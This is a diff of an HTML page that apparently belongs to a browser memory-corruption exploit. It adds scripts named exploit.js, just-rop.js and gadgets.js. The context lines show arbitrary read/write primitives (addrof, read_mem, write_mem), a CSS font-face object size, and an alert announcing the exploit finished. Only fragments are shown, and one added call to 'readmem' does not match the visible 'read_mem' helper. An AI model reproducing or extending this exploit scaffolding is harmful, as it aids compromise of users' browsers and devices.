@@ -1,3 +1,9 @@
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<script type="text/javascript" src="js/utils.js"></script>
+		<script type="text/javascript" src="js/exploit.js"></script>
+		<script type="text/javascript" src="js/network.js"></script>
+		<script type="text/javascript" src="js/just-rop.js"></script>
+		<script type="text/javascript" src="js/gadgets.js"></script>
 <script>
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
@@ -339,6 +345,7 @@ window.write_mem = function(p, buf)
 }
 
 alert(read_mem(addrof(obj), 48));
+alert(readmem(addrof(obj), 24, "one"));
 alert("SUCCESSFULLY FINISHED TEST EXPLOIT!");
 
 }
